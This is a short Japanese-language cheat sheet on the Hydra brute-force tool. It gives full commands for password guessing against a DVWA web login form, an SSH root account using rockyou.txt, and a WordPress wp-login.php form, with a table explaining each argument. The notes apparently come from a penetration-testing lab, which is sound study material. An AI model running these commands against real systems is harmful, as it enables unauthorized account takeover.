# Hydra

様々なプロトコルに対応したBruteForce Attackツール

* ワードリスト　`/usr/share/wordlists/metasploit`

## コマンド例

``` shell
    hydra 192.168.XXX.XXX -s 80 -l gordonb -P /usr/share/wordlists/metasploit/burnett_top1024.txt http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=セッションID;security=low:F=Username and/or password incorrect."
```

``` shell
    # sshでrockyou.txtを使ったパスワード総当たり
    hydra -l root -P rockyou.txt XXX.YYY.ZZZ.III ssh
```

| command                                                  | summary                                     |
| -------------------------------------------------------- | ------------------------------------------- |
| Hydra                                                    | hydraコマンド                               |
| `192.168.XXX.XXX -s 80`                                   | webアプリのアドレスとポート                 |
| `-l gordonb`                                             | パスワードリスト                            |
| `-P /usr/share/wordlists/metasploit/burnett_top1024.txt` | パスワードリスト                            |
| `/vulnerabilities/brute/`                                | リクエスト先のリソース                      |
| `:username=^USER^&password=^PASS^&Login=Login`           | クエリストリングの^USER^,^PASS^が変数に相当 |
| `:H=Cookie: PHPSESSID=セッションID;security=low`         | リクエストのヘッダ(Cookie)                  |
| `:F=Username and/or password incorrect."`                | ログイン失敗時のメッセージ |

## wordpressへのブルートフォースサンプル

``` shell
    sudo hydra XXXXXX -s 80 -l admin -P /home/student/rockyou_mini.txt http-form-post "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:incorrect"
```
